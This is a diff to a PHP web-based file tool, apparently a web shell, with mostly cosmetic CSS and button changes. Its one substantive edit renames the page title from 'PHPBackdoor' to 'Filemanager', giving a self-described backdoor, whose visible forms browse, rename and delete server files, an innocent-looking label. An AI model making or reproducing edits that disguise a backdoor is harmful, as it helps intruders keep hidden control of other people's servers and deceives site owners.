@@ -169,8 +169,6 @@ class XN {
                 self::vers('https://image.flaticon.com/icons/svg/2306/2306142.svg');
                 break;
             case 'log':
-            case 'log1':
-            case 'log2':
                 self::vers('https://image.flaticon.com/icons/svg/2306/2306124.svg');
                 break;
             case 'dat':
@@ -360,7 +358,7 @@ class XN {
             self::$group = self::$group['name'];
         } else {
             self::$group = filegroup($filename);
-        } return (self::$owner."<span class='group'>/".self::$group."</span>");
+        } return (self::$owner."<span class='group'>:".self::$group."</span>");
     }
     public static function ftime($filename) {
         return date('d M Y - H:i A', @filemtime($filename));
@@ -1177,6 +1175,9 @@ function alert($message) {
     .block:first-child {
         border: none;
     }
+    .block .img {
+        display: inline-block;
+    }
     .block .img img {
         width: 50px;
         height: 50px;
@@ -1203,17 +1204,17 @@ function alert($message) {
     }
     .block .date .dir-perms,
     .block .date .file-perms {
-        min-width:100px;
+        min-width:80px;
         display: inline-block;
     }
     .block .date .dir-time,
     .block .date .file-time {
-        min-width:150px;
+        min-width:110px;
         display: inline-block;
     }
     .block .date .dir-owner,
     .block .date .file-owner {
-        min-width:100px;
+        min-width:90px;
         display: inline-block;
     }
     .block a {
@@ -1493,7 +1494,7 @@ function alert($message) {
         vertical-align: middle;
         position: relative;
         z-index: 2;
-        min-width:350px;
+        min-width:300px;
         max-width:500px;
         box-sizing: border-box;
         background: #fff;
@@ -1565,6 +1566,16 @@ function alert($message) {
         .mobile {
             padding-left:25px;
             width:98%;
+        }
+        .modal-rename {
+            width:200px;
+        }
+        .modal-delete .msg {
+            overflow: hidden;
+            word-break:break-all;
+        }
+        .modal {
+            max-width: 300px;
         }
         .table {
             height:440px;
@@ -2186,7 +2197,7 @@ function filterTable() {
     ?>
     <div class="storage">
         <span class="title">
-            PHPBackdoor
+            Filemanager
         </span>
         <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span> 
         <span>Free : <?= XN::hdd('free') ?></span> <span>|</span> 
@@ -2234,6 +2245,11 @@ function filterTable() {
                         </a>
                         <ul class="dropdown">
                             <form method="post" action="?x=<?= getcwd() ?>">
+                                <li>
+                                    <button type="button" onclick="$(document).ready(function () {  
+                                        jqxAlert.alert('Under maintenance');  
+                                    })">Compress zip</button>
+                                </li>
                                 <li>
                                     <button name="action" value="delete">Delete</button>
                                 </li>
@@ -2333,7 +2349,9 @@ function filterTable() {
                                     case 'zip':
                                         ?>
                                         <li>
-                                            <button>Unzip</button>
+                                            <button type="button" onclick="$(document).ready(function () {  
+                                                jqxAlert.alert('Under maintenance');  
+                                            })">Unzip</button>
                                         </li>
                                         <li>
                                             <a href="#delete<?= XN::replace($file['names']) ?>" rel="modal:open">Delete</a>
@@ -2406,7 +2424,7 @@ function filterTable() {
                     <div id="delete<?= XN::replace($file['names']) ?>" class="modal modal-delete">
                         <div class="delete">
                             <div  class="msg">
-                                Your sure want to delete <u><?= $file['names'] ?></u> ?
+                                Your sure want to delete <br><u><?= $file['names'] ?></u> ?
                             </div>
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <div class="button">
